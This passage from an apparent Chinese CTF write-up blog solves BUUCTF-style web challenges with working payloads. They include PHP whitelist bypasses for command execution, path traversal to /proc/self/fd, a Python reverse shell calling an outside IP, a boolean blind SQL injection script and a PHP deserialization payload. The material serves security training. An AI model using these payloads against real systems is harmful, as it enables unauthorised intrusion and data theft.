<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201014214917756.png" srcset="/img/loading.gif" alt="image-20201014214917756"></p>
<p>初版payload</p>
<pre class=" language-php"><code class="language-php"><span class="token punctuation">(</span><span class="token variable">$pi</span><span class="token operator">=</span>base_convert<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">1751504350</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$pi</span><span class="token punctuation">(</span><span class="token number">37907361743</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token number">426836762666</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<p>但字符长度还是超了，超了三个。</p>
<p>通过fuzz进制数来缩短，把system换成exec，把cat换成nl。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201015143039194.png" srcset="/img/loading.gif" alt="image-20201015143039194"></p>
<p>实际构造</p>
<pre class=" language-php"><code class="language-php"><span class="token function">exec</span><span class="token punctuation">(</span>nl <span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">)</span></code></pre>
<p>最终payload</p>
<pre class=" language-php"><code class="language-php"><span class="token punctuation">(</span><span class="token variable">$pi</span><span class="token operator">=</span>base_convert<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">22950</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$pi</span><span class="token punctuation">(</span><span class="token number">1438255411</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token number">474260451114</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<h4 id="思路二-拼接-GET传参"><a href="#思路二-拼接-GET传参" class="headerlink" title="思路二 拼接_GET传参"></a>思路二 拼接_GET传参</h4><pre><code>c=($_GET[a])($_GET[b])&amp;a=system&amp;b=cat /flag</code></pre><p><strong>[ ]可以用{ }替代</strong></p>
<h5 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h5><p>和思路一相似，也是利用进制转换</p>
<p>payload</p>
<pre class=" language-php"><code class="language-php">c<span class="token operator">=</span><span class="token variable">$pi</span><span class="token operator">=</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token number">37907361743</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token number">1598506324</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span>$<span class="token variable">$pi</span><span class="token punctuation">)</span><span class="token punctuation">{</span>pi<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">(</span>$<span class="token variable">$pi</span><span class="token punctuation">)</span><span class="token punctuation">{</span>cos<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>pi<span class="token operator">=</span>system<span class="token operator">&amp;</span>cos<span class="token operator">=</span>cat <span class="token operator">/</span>flag </code></pre>
<h5 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h5><p>简单讲就是把白名单中给的函数与数字异或去构造_GET</p>
<p>脚本</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>

<span class="token variable">$payload</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'abs'</span><span class="token punctuation">,</span> <span class="token string">'acos'</span><span class="token punctuation">,</span> <span class="token string">'acosh'</span><span class="token punctuation">,</span> <span class="token string">'asin'</span><span class="token punctuation">,</span> <span class="token string">'asinh'</span><span class="token punctuation">,</span> <span class="token string">'atan2'</span><span class="token punctuation">,</span> <span class="token string">'atan'</span><span class="token punctuation">,</span> <span class="token string">'atanh'</span><span class="token punctuation">,</span>  <span class="token string">'bindec'</span><span class="token punctuation">,</span> <span class="token string">'ceil'</span><span class="token punctuation">,</span> <span class="token string">'cos'</span><span class="token punctuation">,</span> <span class="token string">'cosh'</span><span class="token punctuation">,</span> <span class="token string">'decbin'</span> <span class="token punctuation">,</span> <span class="token string">'decoct'</span><span class="token punctuation">,</span> <span class="token string">'deg2rad'</span><span class="token punctuation">,</span> <span class="token string">'exp'</span><span class="token punctuation">,</span> <span class="token string">'expm1'</span><span class="token punctuation">,</span> <span class="token string">'floor'</span><span class="token punctuation">,</span> <span class="token string">'fmod'</span><span class="token punctuation">,</span> <span class="token string">'getrandmax'</span><span class="token punctuation">,</span> <span class="token string">'hexdec'</span><span class="token punctuation">,</span> <span class="token string">'hypot'</span><span class="token punctuation">,</span> <span class="token string">'is_finite'</span><span class="token punctuation">,</span> <span class="token string">'is_infinite'</span><span class="token punctuation">,</span> <span class="token string">'is_nan'</span><span class="token punctuation">,</span> <span class="token string">'lcg_value'</span><span class="token punctuation">,</span> <span class="token string">'log10'</span><span class="token punctuation">,</span> <span class="token string">'log1p'</span><span class="token punctuation">,</span> <span class="token string">'log'</span><span class="token punctuation">,</span> <span class="token string">'max'</span><span class="token punctuation">,</span> <span class="token string">'min'</span><span class="token punctuation">,</span> <span class="token string">'mt_getrandmax'</span><span class="token punctuation">,</span> <span class="token string">'mt_rand'</span><span class="token punctuation">,</span> <span class="token string">'mt_srand'</span><span class="token punctuation">,</span> <span class="token string">'octdec'</span><span class="token punctuation">,</span> <span class="token string">'pi'</span><span class="token punctuation">,</span> <span class="token string">'pow'</span><span class="token punctuation">,</span> <span class="token string">'rad2deg'</span><span class="token punctuation">,</span> <span class="token string">'rand'</span><span class="token punctuation">,</span> <span class="token string">'round'</span><span class="token punctuation">,</span> <span class="token string">'sin'</span><span class="token punctuation">,</span> <span class="token string">'sinh'</span><span class="token punctuation">,</span> <span class="token string">'sqrt'</span><span class="token punctuation">,</span> <span class="token string">'srand'</span><span class="token punctuation">,</span> <span class="token string">'tan'</span><span class="token punctuation">,</span> <span class="token string">'tanh'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$k</span><span class="token operator">&lt;=</span><span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$k</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$j</span> <span class="token operator">&lt;=</span><span class="token number">9</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token variable">$payload</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token variable">$i</span><span class="token punctuation">.</span><span class="token variable">$j</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"^$i$j"</span><span class="token punctuation">.</span><span class="token string">"==>$exp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201015144829317.png" srcset="/img/loading.gif" alt="image-20201015144829317"></p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201015144111762.png" srcset="/img/loading.gif" alt="image-20201015144111762"></p>
<p>payload</p>
<pre><code>/?c=$pi=(is_nan^(6).(4)).(tanh^(1).(5));($$pi){pi}(($$pi){abs})&amp;pi=system&amp;abs=cat /flag</code></pre><h4 id="思路三-利用getallheaders"><a href="#思路三-利用getallheaders" class="headerlink" title="思路三 利用getallheaders()"></a>思路三 利用getallheaders()</h4><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201015151540540.png" srcset="/img/loading.gif" alt="image-20201015151540540"></p>
<p>因为get_allheaders返回的是数组，可以用arry[‘xxx’]的方式读取数据。</p>
<p>而[]和字母都被waf了，用{}替代[],头名用数字。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201015151653905.png" srcset="/img/loading.gif" alt="image-20201015151653905"></p>
<p>payload:</p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$pi</span><span class="token operator">=</span>base_convert<span class="token punctuation">,</span><span class="token variable">$pi</span><span class="token punctuation">(</span><span class="token number">696468</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$pi</span><span class="token punctuation">(</span><span class="token number">8768397090111664438</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token number">100</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre>
<p>上传头</p>
<pre class=" language-php"><code class="language-php"><span class="token number">100</span> cat  <span class="token operator">/</span>flag</code></pre>
<h1 id="2020-网鼎杯-白虎组-Web-PicDown"><a href="#2020-网鼎杯-白虎组-Web-PicDown" class="headerlink" title="2020-网鼎杯-白虎组-Web-PicDown"></a>2020-网鼎杯-白虎组-Web-PicDown</h1><p>知识点</p>
<pre><code>/proc/pid/cmdline 包含了用于开始进程的命令 ；
/proc/pid/cwd包含了当前进程工作目录的一个链接 ；
/proc/pid/environ 包含了可用进程环境变量的列表 ；
/proc/pid/exe 包含了正在进程中运行的程序链接；
/proc/pid/fd/ 这个目录包含了进程打开的每一个文件的链接；
/proc/pid/mem 包含了进程在内存中的内容；
/proc/pid/stat包含了进程的状态信息；
/proc/pid/statm 包含了进程的内存使用信息。

linux提供了/proc/self/目录，这个目录比较独特，不同的进程访问该目录时获得的信息是不同的，内容等价于/proc/本进程pid/。进程可以通过访问/proc/self/目录来获取自己的信息。</code></pre><p>常规操作先扫一波再说。</p>
<p>什么都没有。</p>
<p>网页功能就是传入参数url进行文件读取。</p>
<p>合理怀疑存在任意文件读取或目录穿越。</p>
<p>试试读/etc/passwd</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201015155007029.png" srcset="/img/loading.gif" alt="image-20201015155007029"></p>
<p>读/proc/self/cmdline文件查看当前进程执行命令，可以看见main.py正在执行</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201015155226379.png" srcset="/img/loading.gif" alt="image-20201015155226379"></p>
<p>读下源码</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#main.py</span>

<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> Response<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request
<span class="token keyword">import</span> os
<span class="token keyword">import</span> urllib

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

SECRET_FILE <span class="token operator">=</span> <span class="token string">"/tmp/secret.txt"</span>
f <span class="token operator">=</span> open<span class="token punctuation">(</span>SECRET_FILE<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>
SECRET_KEY <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>SECRET_FILE<span class="token punctuation">)</span>


@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'search.html'</span><span class="token punctuation">)</span>


@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/page'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">page</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token operator">not</span> url<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#禁了file伪协议</span>
            res <span class="token operator">=</span> urllib<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
            value <span class="token operator">=</span> res<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
            response <span class="token operator">=</span> Response<span class="token punctuation">(</span>value<span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">'application/octet-stream'</span><span class="token punctuation">)</span>
            response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Disposition'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'attachment; filename=beautiful.jpg'</span>
            <span class="token keyword">return</span> response
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            value <span class="token operator">=</span> <span class="token string">"HACK ERROR!"</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
        value <span class="token operator">=</span> <span class="token string">"SOMETHING WRONG!"</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'search.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span>value<span class="token punctuation">)</span>


@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/no_one_know_the_manager'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">manager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    key <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>SECRET_KEY<span class="token punctuation">)</span>
    <span class="token keyword">if</span> key <span class="token operator">==</span> SECRET_KEY<span class="token punctuation">:</span>
        shell <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"shell"</span><span class="token punctuation">)</span>
        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>shell<span class="token punctuation">)</span>
        res <span class="token operator">=</span> <span class="token string">"ok"</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        res <span class="token operator">=</span> <span class="token string">"Wrong Key!"</span>

    <span class="token keyword">return</span> res


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">,</span> use_reloader<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre>
<p>重点代码在/no_one_know_the_manager路由这</p>
<p>若传入参数key与/tmp/secret.txt中的SECRET_KEY一致，则执行传入的shell参数。</p>
<p>但可以看到</p>
<pre><code>os.remove(SECRET_FILE)</code></pre><p>执行时，secret.txt已经被删掉了。但它是用open打开的，在打开时会创建文件描述符。</p>
<p>可以从/proc/self/fd读文件内容。</p>
<pre><code>?url=../../../../../../proc/self/fd/3</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201015215917291.png" srcset="/img/loading.gif" alt="image-20201015215917291"></p>
<p>传参key和shell,回显ok，但不回显命令执行的结果。进行反弹shell。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201015220654731.png" srcset="/img/loading.gif" alt="image-20201015220654731"></p>
<p>payload</p>
<pre class=" language-python"><code class="language-python"><span class="token operator">/</span>no_one_know_the_manager?key<span class="token operator">=</span><span class="token number">608b8a425ae3a1f6d7e9426582804b8a</span><span class="token operator">&amp;</span>shell<span class="token operator">=</span>python2<span class="token operator">%</span><span class="token number">20</span><span class="token operator">-</span>c<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>27import<span class="token operator">%</span>20socket<span class="token punctuation">,</span>subprocess<span class="token punctuation">,</span>os<span class="token punctuation">;</span>s<span class="token operator">%</span>3dsocket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">2247.56</span><span class="token punctuation">.</span><span class="token number">176.152</span><span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">8080</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">%</span>20os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>p<span class="token operator">%</span>3dsubprocess<span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'/bin/sh'</span><span class="token punctuation">,</span><span class="token string">'-i'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>shell<span class="token operator">%</span>3dTrue<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token number">27</span></code></pre>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201015233736978.png" srcset="/img/loading.gif" alt="image-20201015233736978"></p>
<p>反弹成功，根目录下读flag。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201015233713962.png" srcset="/img/loading.gif" alt="image-20201015233713962"></p>
<h1 id="CISCN-2019-华北赛区-Day2-Web-Web1"><a href="#CISCN-2019-华北赛区-Day2-Web-Web1" class="headerlink" title="CISCN-2019-华北赛区-Day2-Web-Web1"></a>CISCN-2019-华北赛区-Day2-Web-Web1</h1><p>进来页面就说表和列都给你了，试了一下还存在过滤。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201016155344544.png" srcset="/img/loading.gif" alt="image-20201016155344544"></p>
<p>fuzz一下看还有哪些被ban了。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201016155309484.png" srcset="/img/loading.gif" alt="image-20201016155309484"></p>
<p>输入1，2有不同的回显</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201016152644448.png" srcset="/img/loading.gif" alt="image-20201016152644448"></p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201016152707776.png" srcset="/img/loading.gif" alt="image-20201016152707776"></p>
<p>其他数字是这个回显</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201016153026320.png" srcset="/img/loading.gif" alt="image-20201016153026320"></p>
<p>其他字符是返回布尔false</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201016152907399.png" srcset="/img/loading.gif" alt="image-20201016152907399"></p>
<p>那应该就是布尔盲注了。</p>
<p>脚本</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time
url <span class="token operator">=</span> <span class="token string">'http://challenge-1a9f9c5c110d52bb.sandbox.ctfhub.com:10080/index.php'</span>
headers <span class="token operator">=</span> <span class="token punctuation">{</span>
      <span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0'</span><span class="token punctuation">,</span>
      <span class="token string">'Accept'</span><span class="token punctuation">:</span><span class="token string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span><span class="token punctuation">,</span>
      <span class="token string">'Connection'</span><span class="token punctuation">:</span><span class="token string">'keep-alive'</span>
    <span class="token punctuation">}</span>
data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'id'</span> <span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">}</span>
flag<span class="token operator">=</span><span class="token string">""</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    start<span class="token operator">=</span><span class="token number">31</span>
    end<span class="token operator">=</span><span class="token number">130</span>
    mid<span class="token operator">=</span> int<span class="token punctuation">(</span><span class="token punctuation">(</span>start<span class="token operator">+</span>end<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span>

    <span class="token keyword">while</span> start<span class="token operator">&lt;</span>end<span class="token punctuation">:</span>       
        <span class="token keyword">print</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span>end<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>
        <span class="token comment" spellcheck="true">#time.sleep(1)</span>
        data<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"0^(ascii(substr((select(flag)from(flag)),{0},1))>{1})"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>
        html <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">"Hello"</span> <span class="token keyword">in</span> html<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            start<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            end<span class="token operator">=</span>mid
        mid<span class="token operator">=</span> int<span class="token punctuation">(</span><span class="token punctuation">(</span>start<span class="token operator">+</span>end<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span>
    flag<span class="token operator">+=</span>chr<span class="token punctuation">(</span>mid<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre>
<h2 id="浙江省大学生网络与信息安全竞赛-决赛-2019-Web-逆转思维"><a href="#浙江省大学生网络与信息安全竞赛-决赛-2019-Web-逆转思维" class="headerlink" title="浙江省大学生网络与信息安全竞赛-决赛-2019-Web-逆转思维"></a>浙江省大学生网络与信息安全竞赛-决赛-2019-Web-逆转思维</h2><p><strong><em>考点：伪协议</em></strong></p>
<p>进来给了源码，看到这么多file_get_contents大概率是伪协议合集。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201019122045475.png" srcset="/img/loading.gif" alt="image-20201019122045475"></p>
<p>先用传text用php://input过第一个条件，第二个include函数用php://filter读useless.php。</p>
<pre><code>/?text=php://input&amp;file=php://filter/read=convert.base64-encode/resource=useless.php&amp;password=22

同时body里传一个welcome to the zjctf</code></pre><p>读到源码</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201019122521742.png" srcset="/img/loading.gif" alt="image-20201019122521742"></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  

<span class="token keyword">class</span> <span class="token class-name">Flag</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//flag.php  </span>
    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>  
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  
            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
            <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span>"U R <span class="token constant">SO</span> <span class="token constant">CLOSE</span> <span class="token operator">!</span><span class="token comment" spellcheck="true">///COME ON PLZ");</span>
        <span class="token punctuation">}</span>  
    <span class="token punctuation">}</span>  
<span class="token punctuation">}</span>  
<span class="token delimiter">?></span> </code></pre>
<p>就最简单的反序列,向password传一下得到flag。</p>
<p>payload</p>
<pre class=" language-php"><code class="language-php"><span class="token operator">?</span>text<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input&amp;file=useless.php&amp;password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}</span></code></pre>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201019122721837.png" srcset="/img/loading.gif" alt="image-20201019122721837"></p>
<h2 id="BJDCTF-2020-Web-Cookie-is-so-subtle"><a href="#BJDCTF-2020-Web-Cookie-is-so-subtle" class="headerlink" title="BJDCTF-2020-Web-Cookie is so subtle!"></a>BJDCTF-2020-Web-Cookie is so subtle!</h2><p><strong><em>考点：ssti</em></strong></p>
<p>看这题就多少和cookie沾点关系。</p>
<p>三个界面，有用的应该就是flag.php，他的功能是以cookie形式传入用户输入的数据，再将数据作为用户名显示在界面上。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201019130705606.png" srcset="/img/loading.gif" alt="image-20201019130705606"></p>
<p>先是尝试了cookie注入不对，怀疑存在ssti，进行测试。</p>
